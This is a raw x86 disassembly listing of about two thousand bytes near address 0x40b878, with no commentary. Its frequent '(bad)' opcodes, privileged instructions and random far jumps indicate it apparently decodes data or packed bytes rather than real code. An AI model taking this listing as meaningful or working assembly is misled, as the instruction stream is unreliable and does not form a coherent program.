  40b878:	add    cl,ah
  40b87a:	hlt    
  40b87b:	push   ecx
  40b87c:	pop    edx
  40b87d:	sbb    BYTE PTR [esi],0x6b
  40b880:	jmp    0xf07b:0xa095bfec
  40b887:	sub    BYTE PTR [eax],dl
  40b889:	push   ds
  40b88a:	shr    DWORD PTR [ecx+0x77],1
  40b88d:	and    esp,DWORD PTR [eax+0x70523205]
  40b893:	push   ebp
  40b894:	xchg   DWORD PTR [ecx+0x5899876e],ebx
  40b89a:	and    al,0x18
  40b89c:	push   esp
  40b89d:	test   DWORD PTR [esi-0x4b93afa6],0x5c1ff039
  40b8a7:	es lock sub al,0x78
  40b8ab:	into   
  40b8ac:	sbb    ecx,ebp
  40b8ae:	jno    0x40b841
  40b8b0:	gs fmulp st(7),st
  40b8b3:	enter  0xaa65,0xe3
  40b8b7:	mov    dl,0x8d
  40b8b9:	pop    edx
  40b8ba:	push   ebp
  40b8bb:	cld    
  40b8bc:	mov    ds:0x1fd3ba3b,eax
  40b8c1:	sbb    eax,0xc87b34b0
  40b8c6:	leave  
  40b8c7:	shr    DWORD PTR [eax+edi*2-0x4c],0x47
  40b8cc:	sub    cl,al
  40b8ce:	(bad)  
  40b8cf:	(bad)  
  40b8d0:	outs   dx,DWORD PTR ds:[esi]
  40b8d1:	xor    DWORD PTR [ebp+edi*2+0x23fe7721],edx
  40b8d8:	adc    ah,cl
  40b8da:	stos   DWORD PTR es:[edi],eax
  40b8db:	sub    eax,0xb673bf65
  40b8e0:	inc    esi
  40b8e1:	cmp    esi,DWORD PTR [ecx]
  40b8e3:	repz sub ebp,DWORD PTR [eax]
  40b8e6:	and    DWORD PTR [edi-0x5081f597],0xd21af3a4
  40b8f0:	lahf   
  40b8f1:	fwait
  40b8f2:	icebp  
  40b8f3:	push   ecx
  40b8f4:	add    ebx,edx
  40b8f6:	in     eax,0xe4
  40b8f8:	rcr    BYTE PTR [edx+0x4ab64466],0xe4
  40b8ff:	xchg   esi,eax
  40b900:	sub    edx,ebp
  40b902:	pop    esp
  40b903:	adc    esi,esi
  40b905:	push   ds
  40b906:	mov    ah,al
  40b908:	push   es
  40b909:	fist   DWORD PTR [eax]
  40b90b:	jmp    0xfdb4237f
  40b910:	imul   eax,ebp,0xffffff83
  40b913:	sub    BYTE PTR [ecx-0x5b9be70f],ah
  40b919:	adc    bl,BYTE PTR [ebx]
  40b91b:	mov    eax,0x7bc32aa7
  40b920:	mov    edx,0x6941d322
  40b925:	pop    ss
  40b926:	mov    ss,WORD PTR [edx+0x41]
  40b929:	sbb    al,0xd3
  40b92b:	shr    BYTE PTR [bx+di-0x3e5],0x4d
  40b931:	jnp    0x40b8ba
  40b933:	cmp    dh,dl
  40b935:	or     bl,ch
  40b937:	imul   BYTE PTR [esi]
  40b939:	scas   eax,DWORD PTR es:[edi]
  40b93a:	pusha  
  40b93b:	jmp    0xf5528c0a
  40b940:	add    eax,0xc14e4220
  40b945:	mov    edi,0x8ba45ce3
  40b94a:	xlat   BYTE PTR ds:[ebx]
  40b94b:	xchg   esp,eax
  40b94c:	jo     0x40b97b
  40b94e:	scas   al,BYTE PTR es:[edi]
  40b94f:	mov    esi,DWORD PTR [edi+eiz*8-0x445f28b3]
  40b956:	and    ch,bl
  40b958:	ror    BYTE PTR [ebx+edx*2],0x35
  40b95c:	sub    al,BYTE PTR [edi+0x7b]
  40b95f:	push   cs
  40b960:	fsubr  QWORD PTR [eax]
  40b962:	call   0x85a1:0x4e699b98
  40b969:	rcl    BYTE PTR [eax-0x2d],0xb3
  40b96d:	cmp    eax,0x3679b1f9
  40b972:	xchg   esi,eax
  40b973:	retf   
  40b974:	in     al,dx
  40b975:	fldenv [ecx+0x3329711d]
  40b97b:	mov    edx,0xb8150de1
  40b980:	hlt    
  40b981:	push   ebx
  40b982:	push   esp
  40b983:	xor    al,0xf0
  40b985:	xor    esp,DWORD PTR [edi+esi*2+0x4a]
  40b989:	loope  0x40b9a8
  40b98b:	cmp    DWORD PTR [ecx],ebx
  40b98d:	sar    BYTE PTR ds:0x79917b7a,0x83
  40b994:	stc    
  40b995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b996:	lods   al,BYTE PTR ds:[esi]
  40b997:	jae    0x40ba16
  40b999:	scas   eax,DWORD PTR es:[edi]
  40b99a:	mov    ecx,0x9aea0f80
  40b99f:	into   
  40b9a0:	adc    DWORD PTR [eax],ecx
  40b9a2:	adc    eax,0x8376cdb6
  40b9a7:	les    esp,FWORD PTR [ecx+0x63c1a8d2]
  40b9ad:	jmp    0x40b9ce
  40b9af:	jg     0x40b9a6
  40b9b1:	cmp    DWORD PTR [esi],edx
  40b9b3:	and    BYTE PTR [esp+ebx*1],ch
  40b9b6:	cmc    
  40b9b7:	fcmovb st,st(3)
  40b9b9:	cwde   
  40b9ba:	jp     0x40b98d
  40b9bc:	leave  
  40b9bd:	call   0x7adf6017
  40b9c2:	xchg   edx,eax
  40b9c3:	dec    esp
  40b9c4:	ja     0x40ba38
  40b9c6:	inc    ebx
  40b9c7:	mov    dl,0x7
  40b9c9:	sahf   
  40b9ca:	ins    DWORD PTR es:[edi],dx
  40b9cb:	mov    dh,0xf1
  40b9cd:	test   eax,0xe1c88111
  40b9d2:	in     eax,0x2f
  40b9d4:	adc    cl,dh
  40b9d6:	mov    ?,WORD PTR [ecx+0x5e1a12c1]
  40b9dc:	mov    ds:0xd6e3a0a3,eax
  40b9e1:	inc    ebp
  40b9e2:	jne    0x40ba0f
  40b9e4:	fwait
  40b9e5:	jp     0x40b992
  40b9e7:	xchg   ebx,eax
  40b9e8:	sub    bl,al
  40b9ea:	pop    ebp
  40b9eb:	dec    edx
  40b9ec:	fnsave [esi]
  40b9ee:	push   esi
  40b9ef:	xchg   edi,eax
  40b9f0:	test   DWORD PTR [esi],edi
  40b9f2:	pushf  
  40b9f3:	add    cl,BYTE PTR [edi+0x31]
  40b9f6:	out    dx,al
  40b9f7:	push   ebx
  40b9f8:	ja     0x40b9f4
  40b9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9fb:	push   es
  40b9fc:	sbb    al,0x9d
  40b9fe:	mov    eax,ds:0x5eb1dbca
  40ba04:	pop    ds
  40ba05:	les    edi,FWORD PTR [ebp-0x3d9d3042]
  40ba0b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40ba0d:	idiv   bh
  40ba0f:	mov    gs,WORD PTR [edx]
  40ba11:	mov    DWORD PTR [ebx],esp
  40ba13:	mov    al,0xf8
  40ba15:	mov    ds:0xf8014fd3,eax
  40ba1a:	mov    dh,0xe8
  40ba1c:	test   DWORD PTR [eax+0xe],0xaa8a2acd
  40ba23:	ret    
  40ba24:	sbb    cl,BYTE PTR [esi+0x56]
  40ba27:	xchg   esp,eax
  40ba28:	leave  
  40ba29:	daa    
  40ba2a:	mov    ds:0xce8b24d2,al
  40ba2f:	sub    DWORD PTR [eax+eiz*1+0x46],eax
  40ba33:	fiadd  DWORD PTR [ebp-0x5d]
  40ba36:	push   ss
  40ba37:	(bad)  
  40ba38:	mov    BYTE PTR [edx+0x6b],bh
  40ba3b:	jae    0x40ba9e
  40ba3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba3e:	xor    DWORD PTR [eax],ebx
  40ba40:	dec    eax
  40ba41:	arpl   sp,bx
  40ba43:	jno    0x40b9e3
  40ba45:	inc    ebx
  40ba46:	dec    DWORD PTR [ebp-0x5719381e]
  40ba4c:	or     eax,DWORD PTR [ebp+ebp*1-0x7de890d7]
  40ba53:	sub    al,bh
  40ba55:	jg     0x40ba6d
  40ba57:	hlt    
  40ba58:	and    BYTE PTR [edx],cl
  40ba5a:	iret   
  40ba5b:	pop    es
  40ba5c:	imul   edx,DWORD PTR [esi+0xf],0xeb78ac86
  40ba63:	inc    ebp
  40ba64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba65:	xchg   esi,eax
  40ba66:	add    eax,0xeecea9e9
  40ba6b:	dec    al
  40ba6d:	ror    edx,0x64
  40ba70:	xchg   edx,eax
  40ba71:	aam    0x68
  40ba73:	(bad)  
  40ba74:	push   ds
  40ba75:	clc    
  40ba76:	sub    ecx,ebx
  40ba78:	sbb    eax,0x9cc02a3d
  40ba7d:	mov    esp,0x55aee4a7
  40ba82:	or     BYTE PTR [esp+ebp*1],ch
  40ba85:	lock or eax,0x2a7bbb5d
  40ba8b:	mov    edx,0xcf3a0323
  40ba90:	mov    ebp,0xaf1a81ad
  40ba95:	mov    ecx,0x7479daa0
  40ba9a:	fimul  DWORD PTR [ecx+eiz*2-0x386be803]
  40baa1:	out    dx,al
  40baa2:	mov    cl,BYTE PTR [edx]
  40baa4:	idiv   esi
  40baa6:	and    cl,BYTE PTR [edi+0x6d]
  40baa9:	xor    dl,ah
  40baab:	fsub   DWORD PTR [edx+0x16a0b3f0]
  40bab1:	and    esp,ecx
  40bab3:	xchg   edi,esi
  40bab5:	xchg   BYTE PTR [edx+0x2f],al
  40bab8:	scas   al,BYTE PTR es:[edi]
  40bab9:	jbe    0x40ba40
  40babb:	inc    ecx
  40babc:	fnstcw WORD PTR [ecx+0x32]
  40babf:	int    0x88
  40bac1:	mov    esp,0x5c874c59
  40bac6:	jns    0x40bb22
  40bac8:	rcr    DWORD PTR [esi],0x94
  40bacb:	inc    ebp
  40bacc:	jmp    0x40bb2a
  40bace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bacf:	adc    cl,BYTE PTR [eax]
  40bad1:	aas    
  40bad2:	fwait
  40bad3:	scas   al,BYTE PTR es:[edi]
  40bad4:	nop
  40bad5:	clc    
  40bad6:	add    esp,0xffffffff
  40bad9:	scas   al,BYTE PTR es:[edi]
  40bada:	repnz les ebx,FWORD PTR [esi]
  40badd:	add    eax,0xe804e821
  40bae2:	fmul   DWORD PTR [ecx-0x80]
  40bae5:	imul   edi,ebp,0x54
  40bae8:	(bad)  
  40bae9:	mov    ecx,0x90e2b8b7
  40baee:	int3   
  40baef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf0:	add    esp,ebp
  40baf2:	dec    eax
  40baf3:	test   DWORD PTR [edi-0x2b],edi
  40baf6:	fisubr WORD PTR [ebx-0x4ea9e15]
  40bafc:	xor    cl,bh
  40bafe:	ds daa 
  40bb00:	cmc    
  40bb01:	(bad)  
  40bb02:	sti    
  40bb03:	pop    esi
  40bb04:	jl     0x40babb
  40bb06:	jae    0x40bb2f
  40bb08:	outs   dx,BYTE PTR ds:[esi]
  40bb09:	repz cwde 
  40bb0b:	(bad)  
  40bb0c:	sbb    eax,0xbaf3922f
  40bb11:	das    
  40bb12:	xchg   DWORD PTR ds:0xf305c7c0,ebp
  40bb18:	test   eax,0x52f0dc27
  40bb1d:	cs addr16 in al,0xf3
  40bb21:	call   0x9617:0x438c64f5
  40bb28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb29:	ins    BYTE PTR es:[edi],dx
  40bb2a:	outs   dx,DWORD PTR ds:[esi]
  40bb2b:	adc    esi,DWORD PTR [ecx+0x141c6f6f]
  40bb31:	xchg   BYTE PTR [esi+0x5e715265],bl
  40bb37:	sbb    al,BYTE PTR [edx+0x4bc06244]
  40bb3d:	sub    eax,DWORD PTR [ebp+0xd]
  40bb40:	inc    edx
  40bb41:	or     DWORD PTR ds:0xc3617d5d,ebx
  40bb47:	les    edx,FWORD PTR [ebx-0x562a6be6]
  40bb4d:	jmp    0x40bb4b
  40bb4f:	inc    ebx
  40bb50:	lods   al,BYTE PTR ds:[esi]
  40bb51:	adc    cl,BYTE PTR [ebx+0x18fe7d89]
  40bb57:	into   
  40bb58:	ins    BYTE PTR es:[edi],dx
  40bb59:	(bad)  
  40bb5b:	dec    ebp
  40bb5c:	mov    ecx,0x6473015e
  40bb61:	mov    esi,DWORD PTR [edx]
  40bb63:	adc    eax,0x77563490
  40bb68:	bound  esp,QWORD PTR [esi]
  40bb6a:	mov    ds,WORD PTR [esi-0x3e]
  40bb6d:	jmp    0xc998344f
  40bb72:	sub    ah,ah
  40bb74:	sbb    BYTE PTR [esi],al
  40bb76:	lea    edi,[eax+0x52]
  40bb79:	adc    DWORD PTR [ecx-0x39d59e0f],edx
  40bb7f:	fs scas al,BYTE PTR es:[edi]
  40bb81:	cld    
  40bb82:	xor    DWORD PTR [ebp+0x3c332366],0x2b6f9622
  40bb8c:	iret   
  40bb8d:	pop    esp
  40bb8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb8f:	mov    WORD PTR [eax+eiz*2-0x54d8f86b],?
  40bb96:	leave  
  40bb97:	push   es
  40bb98:	sub    BYTE PTR [eax+ebx*8-0x10c60022],bl
  40bb9f:	cmc    
  40bba0:	popf   
  40bba1:	mov    dh,ch
  40bba3:	jns    0x40bb89
  40bba5:	sub    BYTE PTR [edx+0x20],0x93
  40bba9:	sti    
  40bbaa:	mov    cl,0xf2
  40bbac:	(bad)  
  40bbad:	push   ss
  40bbae:	mov    ds:0xc2de7ce0,eax
  40bbb3:	lods   al,BYTE PTR ds:[esi]
  40bbb4:	adc    eax,DWORD PTR [edi-0x3921137b]
  40bbba:	cmp    al,0x84
  40bbbc:	aad    0x1
  40bbbe:	(bad)  
  40bbbf:	clc    
  40bbc0:	cmp    eax,0x841057a3
  40bbc5:	add    dl,0xb
  40bbc8:	and    al,0x6b
  40bbca:	jecxz  0x40bc1b
  40bbcc:	scas   al,BYTE PTR es:[edi]
  40bbcd:	xchg   ecx,eax
  40bbce:	jns    0x40bb70
  40bbd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbd1:	outs   dx,BYTE PTR ds:[esi]
  40bbd2:	push   es
  40bbd3:	cmp    al,0x8d
  40bbd5:	add    al,0xe6
  40bbd7:	ins    DWORD PTR es:[edi],dx
  40bbd8:	scas   al,BYTE PTR es:[edi]
  40bbd9:	dec    esi
  40bbda:	icebp  
  40bbdb:	cdq    
  40bbdc:	sti    
  40bbdd:	ret    0x32be
  40bbe0:	mov    al,ds:0x48261f3
  40bbe5:	mov    esi,0xa0a7c01f
  40bbea:	and    eax,0xfa18ed7a
  40bbef:	(bad)  
  40bbf0:	sbb    esp,DWORD PTR [eax]
  40bbf2:	iret   
  40bbf3:	jns    0x40bbde
  40bbf5:	scas   eax,DWORD PTR es:[edi]
  40bbf6:	mov    BYTE PTR [edi+0x15fd4c08],dl
  40bbfc:	in     al,dx
  40bbfd:	ret    
  40bbfe:	fidivr WORD PTR [esi]
  40bc00:	out    dx,eax
  40bc01:	sar    BYTE PTR [ecx-0x1821db59],0xbe
  40bc08:	xor    al,0x19
  40bc0a:	push   ebp
  40bc0b:	add    al,0x75
  40bc0d:	adc    eax,0xca7e4abc
  40bc12:	cli    
  40bc13:	xor    DWORD PTR [edx+0x54],edi
  40bc16:	lods   eax,DWORD PTR ds:[esi]
  40bc17:	sub    DWORD PTR [eax],0x1
  40bc1a:	sub    al,0xab
  40bc1c:	dec    ebx
  40bc1d:	ret    
  40bc1e:	add    ebp,DWORD PTR [edi+ebx*8-0x73758f6e]
  40bc25:	cmp    bl,dh
  40bc27:	jge    0x40bc9c
  40bc29:	push   ss
  40bc2a:	cmp    al,0x5f
  40bc2c:	pop    eax
  40bc2d:	iret   
  40bc2e:	jge    0x40bc70
  40bc30:	mov    al,0x4a
  40bc32:	mov    dl,0x5
  40bc34:	pop    edi
  40bc35:	inc    ebx
  40bc36:	push   es
  40bc37:	les    eax,FWORD PTR ds:0x81d6b7ed
  40bc3d:	mov    eax,ds:0x40555ed1
  40bc42:	cmp    eax,0xb9e854
  40bc47:	jno    0x40bcb8
  40bc49:	sub    ecx,ebp
  40bc4b:	inc    edi
  40bc4c:	(bad)  
  40bc4d:	xchg   edi,eax
  40bc4e:	xor    al,0xf8
  40bc50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc51:	div    BYTE PTR [edi+0x1e19bcd0]
  40bc57:	enter  0x43b4,0x9f
  40bc5b:	popa   
  40bc5c:	pop    ss
  40bc5d:	sbb    BYTE PTR [ebp+0x6d],0x9e
  40bc61:	sub    eax,0x31c3ea5e
  40bc66:	pop    edi
  40bc67:	add    al,0xb2
  40bc69:	sub    BYTE PTR [ecx-0x3d966fb],dl
  40bc6f:	aas    
  40bc70:	fs push cs
  40bc72:	jmp    DWORD PTR ds:0xd1126e6e
  40bc78:	mov    ah,0x81
  40bc7a:	pop    es
  40bc7b:	xor    bh,BYTE PTR [edx+0x16c17a27]
  40bc81:	sub    eax,0xc094b34a
  40bc86:	popa   
  40bc87:	mov    al,0xc1
  40bc89:	jmp    0x916c:0x9015ae26
  40bc90:	out    dx,eax
  40bc91:	daa    
  40bc92:	loop   0x40bd12
  40bc94:	jnp    0x40bc32
  40bc96:	pop    ss
  40bc97:	push   esi
  40bc98:	jl     0x40bc2c
  40bc9a:	cwde   
  40bc9b:	icebp  
  40bc9c:	sbb    al,0x72
  40bc9e:	lea    edi,[ebx]
  40bca0:	stos   DWORD PTR es:[edi],eax
  40bca1:	bound  ebp,QWORD PTR [edi+edx*4]
  40bca4:	das    
  40bca5:	enter  0xd244,0x8a
  40bca9:	mov    ebx,eax
  40bcab:	retf   
  40bcac:	mov    ebp,0x7b67badf
  40bcb1:	int    0xa0
  40bcb3:	inc    edx
  40bcb4:	ss pop ds
  40bcb6:	sbb    esp,ecx
  40bcb8:	lock sbb BYTE PTR [eax+0x2ebd21df],ah
  40bcbf:	push   ecx
  40bcc0:	and    DWORD PTR [edi],esi
  40bcc2:	dec    esi
  40bcc3:	setnp  BYTE PTR ds:0x6191f1f1
  40bcca:	jmp    0x13272a9a
  40bccf:	push   eax
  40bcd0:	xchg   edx,eax
  40bcd1:	mov    edx,0x2e83a02a
  40bcd6:	mov    DWORD PTR [edi-0x67653307],edx
  40bcdc:	int    0xc7
  40bcde:	cmp    al,0xd8
  40bce0:	xor    edi,DWORD PTR [ebp+0x639bc5a4]
  40bce6:	out    0x2f,eax
  40bce8:	cld    
  40bce9:	clc    
  40bcea:	pusha  
  40bceb:	fimul  DWORD PTR [eax-0x7254b748]
  40bcf1:	(bad)  
  40bcf2:	mov    ch,0xf5
  40bcf4:	xor    al,0x2f
  40bcf6:	dec    ebx
  40bcf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf8:	jle    0x40bd46
  40bcfa:	sti    
  40bcfb:	fist   DWORD PTR [ecx-0x4b99e655]
  40bd01:	adc    dl,BYTE PTR [edx-0x29]
  40bd04:	dec    ecx
  40bd05:	pop    ebp
  40bd06:	rcl    BYTE PTR [ecx],1
  40bd08:	xlat   BYTE PTR ds:[ebx]
  40bd09:	and    eax,0xdeeb9f26
  40bd0e:	ins    BYTE PTR es:[edi],dx
  40bd0f:	into   
  40bd10:	push   edi
  40bd11:	and    ah,BYTE PTR [edi-0x77]
  40bd14:	jp     0x40bd4e
  40bd16:	jae    0x40bd70
  40bd18:	and    eax,0xc4b58178
  40bd1d:	jne    0x40bcd4
  40bd1f:	rol    DWORD PTR ds:0x54502e01,1
  40bd25:	or     BYTE PTR [ebp-0x38],dl
  40bd28:	dec    esi
  40bd29:	sahf   
  40bd2a:	pop    ecx
  40bd2b:	add    al,0x77
  40bd2d:	cld    
  40bd2e:	push   ds
  40bd2f:	jmp    0xbb5ceca8
  40bd34:	jl     0x40bda4
  40bd36:	shl    ebx,cl
  40bd38:	pop    ss
  40bd39:	cmp    eax,0xf9eb2585
  40bd3e:	loop   0x40bd68
  40bd40:	xchg   esp,eax
  40bd41:	sbb    bl,BYTE PTR [ecx-0x28828df6]
  40bd47:	xchg   ecx,eax
  40bd48:	inc    edx
  40bd49:	or     ecx,eax
  40bd4b:	aam    0x46
  40bd4d:	inc    eax
  40bd4e:	mov    ?,esi
  40bd50:	mov    ds:0xc5cc6c2e,al
  40bd55:	retf   0x8970
  40bd58:	or     ebp,DWORD PTR [ebx+esi*4]
  40bd5b:	imul   DWORD PTR [ebx+0x279db3ef]
  40bd61:	inc    esp
  40bd62:	cmp    eax,0x5ade7374
  40bd67:	nop
  40bd68:	mov    bl,0x35
  40bd6a:	imul   esp,DWORD PTR [eax-0x48],0x16
  40bd6e:	sbb    bh,BYTE PTR [ebx-0x51de89d8]
  40bd74:	cmp    DWORD PTR [edx+ecx*2-0x57],esi
  40bd78:	xchg   esp,eax
  40bd79:	jmp    0x8dc562d0
  40bd7e:	inc    ecx
  40bd7f:	dec    ecx
  40bd80:	in     eax,dx
  40bd81:	cs jge 0x40bd51
  40bd84:	sub    eax,0x265faef7
  40bd89:	pop    ebp
  40bd8a:	(bad)  [edx]
  40bd8c:	sub    al,0xe5
  40bd8e:	xlat   BYTE PTR ds:[ebx]
  40bd8f:	ret    
  40bd90:	leave  
  40bd91:	mov    ch,BYTE PTR [ebx-0x54]
  40bd94:	rol    BYTE PTR [ebx],0xa4
  40bd97:	inc    esp
  40bd98:	mov    BYTE PTR [ecx],al
  40bd9a:	outs   dx,BYTE PTR ds:[esi]
  40bd9b:	lods   al,BYTE PTR ds:[esi]
  40bd9c:	add    DWORD PTR [ebp+0x4e779025],ecx
  40bda2:	je     0x40bd80
  40bda4:	daa    
  40bda5:	aas    
  40bda6:	shr    dl,0x34
  40bda9:	pop    edi
  40bdaa:	div    DWORD PTR ds:0x72baf4c4
  40bdb0:	lahf   
  40bdb1:	or     DWORD PTR [ecx-0x6aa2ab44],ecx
  40bdb7:	xchg   BYTE PTR [edx+esi*2+0x4a68101a],al
  40bdbe:	ret    
  40bdbf:	xor    DWORD PTR [ebp+0x4edd148],0x170712e5
  40bdc9:	push   eax
  40bdca:	(bad)  
  40bdcb:	mov    ebp,0x7a5f8283
  40bdd0:	sbb    al,0x2f
  40bdd2:	lock pop ebp
  40bdd4:	popf   
  40bdd5:	lahf   
  40bdd6:	lods   eax,DWORD PTR ds:[esi]
  40bdd7:	mov    eax,ds:0x462f8397
  40bddc:	push   edi
  40bddd:	lea    eax,[esi-0x19b01b4a]
  40bde3:	xor    ebp,edi
  40bde5:	pop    es
  40bde6:	dec    ebx
  40bde7:	call   0xac1c:0x75403736
  40bdee:	ror    DWORD PTR [ebx+ebx*1+0x5d3c9868],1
  40bdf5:	push   ebx
  40bdf6:	jg     0x40bdb5
  40bdf8:	in     eax,dx
  40bdf9:	inc    edi
  40bdfa:	in     al,dx
  40bdfb:	add    al,0xd0
  40bdfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdfe:	aaa    
  40bdff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be00:	ja     0x40bd87
  40be02:	dec    eax
  40be03:	pop    ebx
  40be04:	jmp    FWORD PTR [esp+ebx*2+0x19771a1c]
  40be0b:	sbb    edi,DWORD PTR [esi+0x28a13c8e]
  40be11:	xor    al,0x93
  40be13:	fidivr DWORD PTR [eax+0x75]
  40be16:	cli    
  40be17:	and    dl,BYTE PTR [edi-0x17c85e7b]
  40be1d:	push   esi
  40be1e:	sbb    bl,BYTE PTR [ecx-0x7b]
  40be21:	icebp  
  40be22:	pop    esp
  40be23:	dec    eax
  40be24:	cmp    esp,eax
  40be26:	(bad)  
  40be27:	cmp    eax,DWORD PTR [ebx]
  40be29:	or     DWORD PTR [edi-0x41b9eeb0],eax
  40be2f:	mov    ebp,0x7b5468b9
  40be34:	(bad)  
  40be37:	aam    0x2a
  40be39:	jne    0x40bde7
  40be3b:	adc    esi,DWORD PTR [ebp-0x3167cae6]
  40be41:	xchg   esi,eax
  40be42:	sub    DWORD PTR [ecx+0x549c5ef2],0x1db28410
  40be4c:	ret    
  40be4d:	pusha  
  40be4e:	and    eax,0xa6704095
  40be53:	hlt    
  40be54:	les    eax,FWORD PTR [edi-0xca2684a]
  40be5a:	push   0x58
  40be5c:	sti    
  40be5d:	ins    BYTE PTR es:[edi],dx
  40be5e:	jge    0x40be73
  40be60:	inc    esi
  40be61:	addr16 js 0x40bdee
  40be64:	out    dx,eax
  40be65:	mov    cl,0xf8
  40be67:	popf   
  40be68:	pop    ebp
  40be69:	pop    es
  40be6a:	jmp    0x41fd:0xb318e768
  40be71:	dec    edi
  40be72:	pop    ebp
  40be73:	sub    BYTE PTR [eax+0x0],ch
  40be76:	scas   al,BYTE PTR es:[edi]
  40be77:	push   eax
  40be78:	cmp    BYTE PTR [ebp-0x7f5b8b8a],dh
  40be7e:	mov    ebx,DWORD PTR [edx+edi*1-0x12a0a474]
  40be85:	and    esi,DWORD PTR [esi-0x21]
  40be88:	adc    BYTE PTR [ecx+eax*8-0x50020ebc],0x59
  40be90:	mov    ch,0x99
  40be92:	scas   eax,DWORD PTR es:[edi]
  40be93:	retf   0x2504
  40be96:	sbb    esp,esp
  40be98:	aaa    
  40be99:	jle    0x40bea7
  40be9b:	jp     0x40bea1
  40be9d:	push   0x46
  40be9f:	cmp    DWORD PTR [ebx-0x6eb692bc],ebx
  40bea5:	lods   eax,DWORD PTR ds:[esi]
  40bea6:	sub    DWORD PTR [edx+0x0],eax
  40bea9:	adc    al,0x29
  40beab:	je     0x40be2f
  40bead:	pop    esi
  40beae:	dec    ebx
  40beaf:	dec    esp
  40beb0:	adc    al,0x94
  40beb2:	(bad)  
  40beb3:	scas   eax,DWORD PTR es:[edi]
  40beb4:	adc    BYTE PTR [ebp-0x3149166a],ch
  40beba:	add    bh,bh
  40bebc:	fwait
  40bebd:	pop    ebp
  40bebe:	xchg   DWORD PTR [esi],edi
  40bec0:	lahf   
  40bec1:	xchg   esp,eax
  40bec2:	and    BYTE PTR [ebx],0x9d
  40bec5:	jae    0x40be48
  40bec7:	(bad)  
  40bec8:	in     al,0xf7
  40beca:	lea    esi,[ebp+0x1a82d2f6]
  40bed0:	dec    ebx
  40bed1:	ss pushf 
  40bed3:	dec    edx
  40bed4:	aam    0x20
  40bed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed7:	and    eax,0xd8610de4
  40bedc:	pop    edi
  40bedd:	(bad)  
  40bede:	icebp  
  40bedf:	dec    esi
  40bee0:	mov    al,ds:0x80239301
  40bee5:	inc    ebp
  40bee6:	pop    edx
  40bee7:	sbb    dl,BYTE PTR [ebp+esi*8+0x69a7483b]
  40beee:	ja     0x40bf1d
  40bef0:	adc    ecx,edi
  40bef2:	call   0x34c1:0xc108f9b1
  40bef9:	ret    
  40befa:	inc    ecx
  40befb:	loope  0x40bec2
  40befd:	loop   0x40beb9
  40beff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf00:	push   esi
  40bf01:	lods   eax,DWORD PTR ds:[esi]
  40bf02:	pop    esi
  40bf03:	or     al,0xde
  40bf05:	inc    eax
  40bf06:	adc    DWORD PTR [ecx-0x51],edx
  40bf09:	je     0x40be8f
  40bf0b:	scas   eax,DWORD PTR es:[edi]
  40bf0c:	xchg   edi,eax
  40bf0d:	mov    eax,0xfdff5c94
  40bf12:	mov    ecx,0xff7349a1
  40bf17:	out    dx,eax
  40bf18:	ds inc ecx
  40bf1a:	pop    ebp
  40bf1b:	jge    0x40bf72
  40bf1d:	std    
  40bf1e:	call   0x2402:0xadae54f6
  40bf25:	aaa    
  40bf26:	xchg   ebp,eax
  40bf27:	out    0x7,al
  40bf29:	sahf   
  40bf2a:	jle    0x40bf98
  40bf2c:	cmp    DWORD PTR ds:0xe973f589,0x5407c748
  40bf36:	scas   al,BYTE PTR es:[edi]
  40bf37:	outs   dx,DWORD PTR ds:[esi]
  40bf38:	aad    0xeb
  40bf3a:	and    DWORD PTR [edi+0x39],0xffffff85
  40bf3e:	xor    ecx,DWORD PTR [eax+eiz*2]
  40bf41:	call   eax
  40bf43:	lods   eax,DWORD PTR ds:[esi]
  40bf44:	push   esp
  40bf45:	mov    cl,0x90
  40bf47:	(bad)
  40bf4c:	jns    0x40bee9
  40bf4e:	(bad)  ss:[ebp+0x7f18c125]
  40bf55:	dec    esi
  40bf56:	sbb    esp,DWORD PTR [eax-0x36]
  40bf59:	test   BYTE PTR ds:0x9d0a420f,dl
  40bf5f:	dec    edx
  40bf60:	test   BYTE PTR [eax],bh
  40bf62:	mov    esp,0xad05de4c
  40bf67:	mov    ecx,ss
  40bf69:	xchg   ebx,eax
  40bf6a:	push   edx
  40bf6b:	jmp    0xc929924e
  40bf70:	bound  esp,QWORD PTR [eax+0x4d]
  40bf73:	pop    ebp
  40bf74:	sbb    al,BYTE PTR [edi+0x7cfa1a97]
  40bf7a:	stos   BYTE PTR es:[edi],al
  40bf7b:	sub    DWORD PTR [ebp-0x59],ebx
  40bf7e:	es xchg edx,eax
  40bf80:	xor    edi,DWORD PTR ds:0x4b4d1c62
  40bf86:	loopne 0x40bfa3
  40bf88:	sbb    DWORD PTR [edi+eiz*1+0x19],edi
  40bf8c:	pop    ss
  40bf8d:	ja     0x40bfc7
  40bf8f:	inc    esp
  40bf90:	adc    edx,ecx
  40bf92:	ja     0x40bffc
  40bf94:	pop    ebx
  40bf95:	(bad)  
  40bf96:	je     0x40bf1b
  40bf98:	cmp    al,0xcc
  40bf9a:	fdivr  DWORD PTR [esi+0x7f42ac5c]
  40bfa0:	xor    DWORD PTR [edx-0x12830988],ebp
  40bfa6:	outs   dx,BYTE PTR ds:[esi]
  40bfa7:	mov    eax,0x6fb1d719
  40bfac:	or     BYTE PTR [edi+0x52],dh
  40bfaf:	dec    dx
  40bfb1:	mov    ah,0x42
  40bfb3:	adc    al,0x2c
  40bfb5:	out    dx,al
  40bfb6:	cmp    bl,bh
  40bfb8:	or     dl,dl
  40bfba:	sti    
  40bfbb:	mov    esi,0x4726b176
  40bfc0:	lock popf 
  40bfc2:	dec    edx
  40bfc3:	popf   
